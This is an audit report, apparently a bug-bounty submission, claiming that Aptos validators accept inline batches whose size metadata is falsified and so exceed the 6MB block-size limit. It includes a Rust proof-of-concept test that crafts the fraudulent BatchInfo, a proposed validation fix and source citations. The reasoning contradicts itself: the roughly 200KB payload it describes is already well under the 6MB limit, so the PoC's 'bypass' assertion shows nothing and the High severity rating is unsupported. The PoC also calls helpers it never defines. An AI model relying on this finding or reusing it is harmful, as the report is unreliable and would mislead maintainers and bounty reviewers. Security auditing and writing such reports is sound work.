# Audit Report

## Title
Inline Batch Size Validation Bypass Allows Malicious Validators to Exceed Block Size Limits

## Summary
A malicious block proposer can craft inline batches with fraudulent size metadata (`BatchInfo.num_bytes`) that underreports the actual transaction payload size. The receiving validators only validate the cryptographic digest but not the size metadata fields, allowing payloads approaching 200KB to bypass the `max_receiving_block_bytes` limit (6 MB) and cause memory exhaustion or validator slowdowns.

## Finding Description

The vulnerability exists in how inline batches within `QuorumStoreInlineHybrid` and `QuorumStoreInlineHybridV2` payloads are validated and sized. When a validator receives a block proposal containing inline batches, two critical validation gaps exist:

**Gap 1: Missing Size Metadata Validation**

The `Payload::verify_inline_batches()` method only verifies that the cryptographic digest of the transaction payload matches the `BatchInfo.digest` field: [1](#0-0) 

This validation ensures hash integrity but does NOT verify that `BatchInfo.num_bytes` or `BatchInfo.num_txns` accurately reflect the actual serialized size and count of the transactions in the payload.

**Gap 2: Incorrect Size Calculation**

The `Payload::size()` method calculates the payload size by summing only the metadata field `batch_info.num_bytes()` while ignoring the actual transaction vector size: [2](#0-1) 

This size calculation is used by the round manager to enforce the `max_receiving_block_bytes` limit: [3](#0-2) 

**Attack Execution Path:**

1. Malicious validator (block proposer) creates inline batches with transactions totaling 200KB
2. Manually constructs `BatchInfo` with `num_bytes = 1000` (false metadata) using the public constructor: [4](#0-3) 
3. Computes correct `digest = hash(author, large_transactions)` to pass digest validation
4. Creates `Payload::QuorumStoreInlineHybrid` with `(malicious_BatchInfo, large_transactions)`
5. Sends proposal to network via consensus protocol: [5](#0-4) 

**Receiving Validator Processing:**

1. Network layer deserializes message with full 200KB transaction data into memory [6](#0-5) 
2. `ProposalMsg::verify()` calls `Payload::verify()`: [7](#0-6) 
3. Digest validation passes (attacker computed it correctly over actual transactions)
4. Size check executes: `payload.size()` returns `1000` bytes instead of `200KB`
5. Validation `1000 <= 6MB` passes incorrectly, accepting oversized payload

The inline batch configuration allows up to 200KB per the config: [8](#0-7) 

## Impact Explanation

**Severity: HIGH** ($50,000 tier - "Validator node slowdowns")

This vulnerability violates the **Resource Limits** critical invariant (#9: "All operations must respect gas, storage, and computational limits") and enables:

1. **Memory Exhaustion**: Validators deserialize up to 200KB payloads while size checks report minimal sizes, allowing memory consumption attacks
2. **Validator Node Degradation**: Processing oversized inline batches increases CPU and memory pressure on consensus nodes
3. **DoS Attack Vector**: Repeated exploitation across multiple rounds degrades validator performance
4. **Bypass of Safety Mechanisms**: The `max_receiving_block_bytes` limit (6 MB) exists to prevent resource exhaustion but is completely bypassed

While this doesn't cause immediate consensus safety violations or fund loss, sustained exploitation causes validator slowdowns affecting network liveness and performance, qualifying for High severity per the bug bounty program.

## Likelihood Explanation

**Likelihood: MEDIUM-HIGH**

Requirements for exploitation:
- Attacker must control a validator node (or compromise one)
- Attacker must be selected as block proposer for the round
- Attacker must modify consensus code to craft malicious `BatchInfo` structures

The likelihood is medium-high because:
- AptosBFT threat model assumes up to 1/3 Byzantine validators
- A determined attacker controlling even one validator can exploit this repeatedly when selected as proposer
- No additional cryptographic barriers prevent exploitation once validator control is achieved
- The vulnerability persists across all blocks the malicious validator proposes

## Recommendation

Add validation in `Payload::verify_inline_batches()` to ensure `BatchInfo` metadata fields accurately reflect the actual transaction payload:

```rust
pub fn verify_inline_batches<'a, T: TBatchInfo + 'a>(
    inline_batches: impl Iterator<Item = (&'a T, &'a Vec<SignedTransaction>)>,
) -> anyhow::Result<()> {
    for (batch, payload) in inline_batches {
        // Existing digest validation
        let computed_digest = BatchPayload::new(batch.author(), payload.clone()).hash();
        ensure!(
            computed_digest == *batch.digest(),
            "Hash of the received inline batch doesn't match the digest value for batch {:?}: {} != {}",
            batch,
            computed_digest,
            batch.digest()
        );
        
        // NEW: Validate num_txns matches actual transaction count
        ensure!(
            payload.len() as u64 == batch.num_txns(),
            "Inline batch transaction count {} doesn't match BatchInfo.num_txns {}",
            payload.len(),
            batch.num_txns()
        );
        
        // NEW: Validate num_bytes matches actual serialized size
        let actual_bytes = BatchPayload::new(batch.author(), payload.clone()).num_bytes();
        ensure!(
            actual_bytes as u64 == batch.num_bytes(),
            "Inline batch size {} doesn't match BatchInfo.num_bytes {}",
            actual_bytes,
            batch.num_bytes()
        );
    }
    Ok(())
}
```

Additionally, update `Payload::size()` to calculate actual transaction sizes as a defense-in-depth measure, though the validation above is the primary fix.

## Proof of Concept

```rust
// Proof of concept demonstrating the vulnerability
// File: consensus/src/round_manager_tests/inline_batch_size_bypass_test.rs

#[test]
fn test_inline_batch_size_validation_bypass() {
    use aptos_consensus_types::{
        common::{BatchPayload, Payload, ProofWithData},
        proof_of_store::BatchInfo,
    };
    use aptos_crypto::HashValue;
    use aptos_types::{
        transaction::SignedTransaction,
        chain_id::ChainId,
    };
    
    // Step 1: Create large transaction payload (200KB worth of transactions)
    let mut large_txns = Vec::new();
    for i in 0..200 {
        // Each transaction ~1KB, total ~200KB
        large_txns.push(create_dummy_signed_transaction(i, 1024));
    }
    
    let batch_author = create_test_peer_id();
    let batch_payload = BatchPayload::new(batch_author, large_txns.clone());
    
    // Actual size is ~200KB
    let actual_size = batch_payload.num_bytes();
    assert!(actual_size > 190_000, "Payload should be ~200KB");
    
    // Step 2: Create malicious BatchInfo with fraudulent num_bytes
    let malicious_batch_info = BatchInfo::new(
        batch_author,
        BatchId::new(0),
        0, // epoch
        u64::MAX, // expiration
        batch_payload.hash(), // Correct digest to pass verification
        batch_payload.num_txns() as u64, // Correct txn count
        1000, // FRAUDULENT: claim only 1KB instead of 200KB
        0, // gas_bucket_start
    );
    
    // Step 3: Create payload with malicious batch info
    let inline_batches = vec![(malicious_batch_info.clone(), large_txns.clone())];
    let malicious_payload = Payload::QuorumStoreInlineHybrid(
        inline_batches,
        ProofWithData::empty(),
        None,
    );
    
    // Step 4: Verify passes (only checks digest, not size)
    let validator_verifier = create_test_validator_verifier();
    let proof_cache = ProofCache::new(1000);
    assert!(malicious_payload.verify(&validator_verifier, &proof_cache, true).is_ok(),
        "Malicious payload passes verification despite fraudulent size");
    
    // Step 5: Size calculation returns fraudulent value
    let reported_size = malicious_payload.size();
    assert_eq!(reported_size, 1000, "Payload reports fraudulent 1KB size");
    assert!(reported_size < actual_size, "Reported size vastly understates actual size");
    
    // Step 6: Demonstrate bypass of max_receiving_block_bytes check
    let max_receiving_block_bytes = 6 * 1024 * 1024; // 6MB limit
    assert!(reported_size as u64 <= max_receiving_block_bytes,
        "Fraudulent size bypasses limit check");
    
    println!("VULNERABILITY CONFIRMED:");
    println!("  Actual payload size: {} bytes (~{}KB)", actual_size, actual_size / 1024);
    println!("  Reported size: {} bytes", reported_size);
    println!("  Size validation BYPASSED via fraudulent BatchInfo.num_bytes");
}
```

## Notes

This vulnerability requires a Byzantine validator (block proposer) to actively craft malicious proposals. While validators are typically trusted, the AptosBFT consensus protocol is designed to tolerate up to 1/3 Byzantine validators, making this a valid threat within the security model. The fix is straightforward and should be applied to prevent resource exhaustion attacks from compromised or malicious validators.

### Citations

**File:** consensus/consensus-types/src/common.rs (L505-512)
```rust
            Payload::QuorumStoreInlineHybrid(inline_batches, proof_with_data, _)
            | Payload::QuorumStoreInlineHybridV2(inline_batches, proof_with_data, _) => {
                proof_with_data.num_bytes()
                    + inline_batches
                        .iter()
                        .map(|(batch_info, _)| batch_info.num_bytes() as usize)
                        .sum::<usize>()
            },
```

**File:** consensus/consensus-types/src/common.rs (L541-556)
```rust
    pub fn verify_inline_batches<'a, T: TBatchInfo + 'a>(
        inline_batches: impl Iterator<Item = (&'a T, &'a Vec<SignedTransaction>)>,
    ) -> anyhow::Result<()> {
        for (batch, payload) in inline_batches {
            // TODO: Can cloning be avoided here?
            let computed_digest = BatchPayload::new(batch.author(), payload.clone()).hash();
            ensure!(
                computed_digest == *batch.digest(),
                "Hash of the received inline batch doesn't match the digest value for batch {:?}: {} != {}",
                batch,
                computed_digest,
                batch.digest()
            );
        }
        Ok(())
    }
```

**File:** consensus/src/round_manager.rs (L1187-1193)
```rust
        ensure!(
            validator_txns_total_bytes + payload_size as u64
                <= self.local_config.max_receiving_block_bytes,
            "Payload size {} exceeds the limit {}",
            payload_size,
            self.local_config.max_receiving_block_bytes,
        );
```

**File:** consensus/consensus-types/src/proof_of_store.rs (L61-81)
```rust
    pub fn new(
        author: PeerId,
        batch_id: BatchId,
        epoch: u64,
        expiration: u64,
        digest: HashValue,
        num_txns: u64,
        num_bytes: u64,
        gas_bucket_start: u64,
    ) -> Self {
        Self {
            author,
            batch_id,
            epoch,
            expiration,
            digest,
            num_txns,
            num_bytes,
            gas_bucket_start,
        }
    }
```

**File:** consensus/src/network_interface.rs (L52-52)
```rust
    ProposalMsg(Box<ProposalMsg>),
```

**File:** network/framework/src/protocols/wire/handshake/v1/mod.rs (L226-252)
```rust
    pub fn from_bytes<T: DeserializeOwned>(&self, bytes: &[u8]) -> anyhow::Result<T> {
        // Start the deserialization timer
        let deserialization_timer = start_serialization_timer(*self, DESERIALIZATION_LABEL);

        // Deserialize the message
        let result = match self.encoding() {
            Encoding::Bcs(limit) => self.bcs_decode(bytes, limit),
            Encoding::CompressedBcs(limit) => {
                let compression_client = self.get_compression_client();
                let raw_bytes = aptos_compression::decompress(
                    &bytes.to_vec(),
                    compression_client,
                    MAX_APPLICATION_MESSAGE_SIZE,
                )
                .map_err(|e| anyhow! {"{:?}", e})?;
                self.bcs_decode(&raw_bytes, limit)
            },
            Encoding::Json => serde_json::from_slice(bytes).map_err(|e| anyhow!("{:?}", e)),
        };

        // Only record the duration if deserialization was successful
        if result.is_ok() {
            deserialization_timer.observe_duration();
        }

        result
    }
```

**File:** consensus/consensus-types/src/proposal_msg.rs (L97-101)
```rust
        let (payload_result, sig_result) = rayon::join(
            || {
                self.proposal().payload().map_or(Ok(()), |p| {
                    p.verify(validator, proof_cache, quorum_store_enabled)
                })
```

**File:** config/src/config/consensus_config.rs (L229-230)
```rust
            max_sending_inline_txns: 100,
            max_sending_inline_bytes: 200 * 1024,       // 200 KB
```
